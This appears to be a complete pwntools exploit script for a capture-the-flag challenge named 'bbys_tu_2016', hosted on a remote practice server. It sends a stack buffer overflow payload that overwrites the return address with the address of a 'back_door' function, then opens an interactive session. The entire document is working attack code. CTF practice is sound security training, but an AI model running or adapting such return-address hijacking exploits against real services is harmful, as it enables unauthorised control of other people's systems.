from pwn import *


# p = process("./bbys_tu_2016")
p = remote("node4.buuoj.cn", 25963)


back_door = 0x0804856D

pad = cyclic(0xc+0x8+0x4)+p32(back_door)
p.sendline(pad)

p.interactive()

